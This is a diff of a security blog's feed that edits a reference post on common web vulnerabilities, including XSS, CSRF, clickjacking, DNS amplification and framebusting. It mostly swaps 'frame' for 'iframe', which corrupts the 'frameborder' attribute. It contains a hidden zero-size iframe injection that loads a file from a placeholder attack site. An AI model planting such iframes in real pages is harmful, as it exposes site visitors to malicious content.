@@ -648,7 +648,6 @@ Spawning thread number: 10
 &lt;/ul&gt;
 &lt;p&gt;[1] When the Python interpreter is invoked with the &lt;code&gt;-O&lt;/code&gt; flag, optimized code is generated and stored in &lt;strong&gt;&lt;em&gt;.pyo&lt;/em&gt;&lt;/strong&gt; files. The optimizer removes assert statements.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3</dc:creator><pubDate>Sat, 01 Nov 2014 04:20:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-11-01:a-closer-look-at-chromes-security-understanding-v8.html</guid><category>V8</category><category>JIT</category><category>JavaScript</category><category>garbage_collection</category><category>cache</category><category>bytecode</category><category>Chrome</category><category>Python</category></item><item><title>A List of Common Web Vulnerabilities</title><link>http://bt3gl.github.io/a-list-of-common-web-vulnerabilities.html</link><description>&lt;p&gt;Although nomenclatures don't help  much when you are solving a security problem, in this post I am keeping a descriptive list for web vulnerabilities as a reference.&lt;/p&gt;
 &lt;p&gt;If you like this subject, I recommend &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Exploiting the web in 20 lessons&lt;/a&gt; and &lt;a href="http://bt3gl.github.io/exploring-d-ctf-quals-2014s-exploits.html"&gt;D-Camp CTF 2014&lt;/a&gt;.&lt;/p&gt;
-&lt;h1&gt;Vulnerabilities to Web Applications&lt;/h1&gt;
 &lt;h2&gt;Cross-site Scripting (XSS)&lt;/h2&gt;
 &lt;p&gt;XSS is caused by &lt;strong&gt;insufficient input validation and/or output escaping&lt;/strong&gt;. This type of vulnerability might allow an attacker to insert HTML markup or JavaScript snippets in a vulnerable website. The injected  code would have access to resources from the website (within the &lt;em&gt;Same Origin Policy&lt;/em&gt;), and in many cases, to cookies stored by the client.&lt;/p&gt;
 &lt;p&gt;HTML has five characters that are reserved:&lt;/p&gt;
@@ -710,7 +709,7 @@ Spawning thread number: 10
 &lt;h3&gt;Examples of exploitation:&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;
-&lt;p&gt;A browser window with frame might remain &lt;em&gt;Same Origin&lt;/em&gt; to another window. In this case even if the user logs out from one account, a third-party can still submit their password and username. In a simple example, the attacker's website is open and it keeps a frame pointing to a sensitive page. The victims logs into that sensitive page in another window.  Then, the attacker-controlled frame executes the code injection and, despite the change of  HTTP credentials, this  will access the previous loaded frame.&lt;/p&gt;
+&lt;p&gt;A browser window with iframe might remain &lt;em&gt;Same Origin&lt;/em&gt; to another window. In this case even if the user logs out from one account, a third-party can still submit their password and username. In a simple example, the attacker's website is open and it keeps an iframe pointing to a sensitive page. The victims logs into that sensitive page in another window.  Then, the attacker-controlled iframe executes the code injection and, despite the change of  HTTP credentials, this  will access the previous loaded iframe.&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;In several home network routers, CSRF can permit attackers to access the device and intercept or modify the network traffic.&lt;/p&gt;
@@ -747,12 +746,11 @@ Spawning thread number: 10
 &lt;p&gt;HTTP requests may include a &lt;em&gt;Referer&lt;/em&gt; header that contains the URL of documents that triggered the current navigation in some way. The header also may reveal some information about the user browsing habits, such as query parameters in the referring page.&lt;/p&gt;
 &lt;p&gt;This vulnerability is created by disclosure of a sensitive URL by embedding an off-site sub-resource of providing an off-site link. Any security data encoded in the URL of the parent document will be leaked in the &lt;em&gt;Referer&lt;/em&gt; header.&lt;/p&gt;
 &lt;hr /&gt;
-&lt;h1&gt;Vulnerabilities to Web Application Design&lt;/h1&gt;
 &lt;h2&gt;Cache Poising&lt;/h2&gt;
 &lt;p&gt;Long-term pollution of the browser cache (or any proxy within) with a malicious version of the targeted web application. Encrypted web applications may be targeted due to response-splitting vulnerabilities. In non-encrypted traffic, network attackers may be able to modify responses too.&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;Clickjacking&lt;/h2&gt;
-&lt;p&gt;The act of obscuring a portion of a web application so that the victim is not aware that individual clicks are delivered to other site. For example, a malicious site wraps another site in a frame.&lt;/p&gt;
+&lt;p&gt;The act of obscuring a portion of a web application so that the victim is not aware that individual clicks are delivered to other site. For example, a malicious site wraps another site in an iframe.&lt;/p&gt;
 &lt;p&gt;If a website includes iframe, there is a chance that it can perform a SQL query searching for iframe code. For example:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;blog_posts&lt;/span&gt; &lt;span class="n"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;post_text&lt;/span&gt; &lt;span class="n"&gt;LIKE&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;iframe&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -760,7 +758,7 @@ Spawning thread number: 10
 
 &lt;hr /&gt;
 &lt;h2&gt;Content and Character Set Sniffing&lt;/h2&gt;
-&lt;p&gt;Possibility that the browser will ignore any authoritative content type of character set information provided by the server and interpret the returned document incorrectly.&lt;/p&gt;
+&lt;p&gt;Possibility that the browser will ignore any authoritative content type of character set provided by the server and interpret the returned document incorrectly.&lt;/p&gt;
 &lt;h3&gt;Examples of exploitation:&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;Scenarios where &lt;a href="http://www.w3.org/Protocols/rfc1341/4_Content-Type.html"&gt;Content-Type&lt;/a&gt; is ignored.&lt;/li&gt;
@@ -779,13 +777,11 @@ Spawning thread number: 10
 &lt;p&gt;DNS resolvers are attractive targets to attackers who exploit the resolvers' large response-to-request size ratio to gain additional free bandwidth. Resolvers that support EDNS0 (Extension Mechanisms for DNS) are especially vulnerable because of the substantially larger packet size that they can return.&lt;/p&gt;
 &lt;h3&gt;Examples of exploitation:&lt;/h3&gt;
 &lt;p&gt;In an amplification scenario, the attack proceeds as follows:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;The attacker sends a victim DNS server queries using a forged source IP address. The queries may be sent from a single system or a network of systems all using the same forged IP address. The queries are for records that the attacker knows will result in much larger responses, up to several dozen times1 the size of the original queries..&lt;/li&gt;
-&lt;li&gt;The victim server sends the large responses to the source IP address passed in the forged requests, overwhelming the system and causing a DoS situation.&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;1) The attacker sends a victim DNS server queries using a forged source IP address. The queries may be sent from a single system or a network of systems all using the same forged IP address. The queries are for records that the attacker knows will result in much larger responses, up to several dozen times1 the size of the original queries..&lt;/p&gt;
+&lt;p&gt;2) The victim server sends the large responses to the source IP address passed in the forged requests, overwhelming the system and causing a DoS situation.&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;Framebusting&lt;/h2&gt;
-&lt;p&gt;The possibility of a framed page navigating the top-level document to a new URL without having to satisfy &lt;strong&gt;same-origin&lt;/strong&gt; checks. It might be exploited for phishing.&lt;/p&gt;
+&lt;p&gt;The possibility of a iframed page navigating the top-level document to a new URL without having to satisfy &lt;strong&gt;same-origin&lt;/strong&gt; checks. It might be exploited for phishing.&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;HTTP Downgrade&lt;/h2&gt;
 &lt;p&gt;Ability of an attacker to prevent the user from reaching an HTTPS version of a site or to downgrade an existing HTTPS session to HTTP.&lt;/p&gt;
@@ -811,7 +807,7 @@ Spawning thread number: 10
 &lt;ul&gt;
 &lt;li&gt;Malicious code injections in an iframe to the attack site:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class="na"&gt;frameborder=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;height=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://&amp;lt;attack-site&amp;gt;/path/file&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;style=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;display:none&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;width=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class="na"&gt;iframeborder=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;height=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://&amp;lt;attack-site&amp;gt;/path/file&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;style=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;display:none&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;width=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
